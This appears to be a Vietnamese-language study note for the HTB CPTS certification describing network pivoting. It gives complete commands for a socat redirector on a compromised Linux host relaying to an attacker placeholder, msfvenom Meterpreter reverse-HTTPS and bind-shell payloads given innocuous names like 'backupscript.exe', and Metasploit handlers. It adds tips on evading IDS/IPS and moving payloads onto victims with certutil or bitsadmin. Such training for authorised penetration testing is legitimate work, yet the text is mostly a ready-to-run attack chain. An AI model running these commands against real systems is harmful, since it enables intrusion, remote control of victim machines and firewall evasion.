---
title: "Socat Redirector + Metasploit Reverse HTTPS"
date: 2026-04-23 16:29:54 +0700
categories: [HTB_CPTS, Pivot]
tags: [pivoting, socat, metasploit, reverse-https]
description: "HTB CPTS note về Socat redirector kết hợp Metasploit reverse HTTPS payload."
pin: false
---
platform: Windows → Linux Pivot → Attacker

> ****Mục đích****
> Bypass firewall khi **target không connect trực tiếp** được đến attacker. Dùng pivot host (Ubuntu) làm redirector.

## 📡 Architecture
```

Victim (Windows)
↓ reverse_https
Pivot (Ubuntu) :8080 ←── socat ──→ Attacker :80 (MSF listener)
````
## 1. Socat Listener (trên Pivot Ubuntu)

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80
````

> **fork là bắt buộc để handle nhiều session cùng lúc.**

---
## 2. Tạo Payload (trên Attacker)


```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<PIVOT_IP> \
  LPORT=8080 \
  -f exe -o backupscript.exe
```

> **LHOST phải là **IP của Pivot**, không phải IP attacker.**

---
## 3. Multi/Handler (trên Attacker)

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```



Victim → Pivot:8080 → Socat forward → Attacker:80 → Meterpreter session

## 💡 Lưu ý thực chiến

- Dùng reverse_https để bypass IDS/IPS tốt hơn.
- Port 8080 trên pivot thường ít bị block.
- Muốn encrypt tunnel: thay TCP4 bằng OPENSSL-LISTEN + cert.
- Transfer payload lên Windows bằng certutil / bitsadmin / SMB...


# Socat Bind Shell Redirector

platform: Windows Bind Shell → Linux Pivot → Attacker

**Mục đích** Dùng khi inbound vào Windows bị chặn. Victim listen bind shell, attacker connect vào pivot → socat forward traffic đến bind shell.

**📡 Architecture (Bind Shell)**

```bash
Attack Host (MSF Bind Handler)
     ↓ connect vào
Ubuntu Pivot (Socat:8080)  ←── forward ──► Windows A (Bind Shell:8443)
```

**1. Tạo Payload Bind Shell (trên Attacker)**

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

**2. Socat Bind Listener (trên Pivot Ubuntu)**

```bash
socat TCP4-LISTEN:8080,fork TCP4:<WINDOWS_IP>:8443
```

**3. Multi/Handler Bind (trên Attacker)**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <UBUNTU_IP>
set LPORT 8080
run
```

**Kết quả** Attacker → Pivot:8080 → Socat forward → Windows:8443 → Meterpreter session

**💡 Lưu ý thực chiến**

- Bind shell ít stealth hơn reverse (victim phải mở port listen).
- Dùng khi outbound từ victim khó nhưng inbound từ pivot OK.
- fork vẫn bắt buộc.
- Muốn encrypt: thay TCP4 bằng OPENSSL-LISTEN + cert.
- Transfer payload: certutil / bitsadmin / SMB...
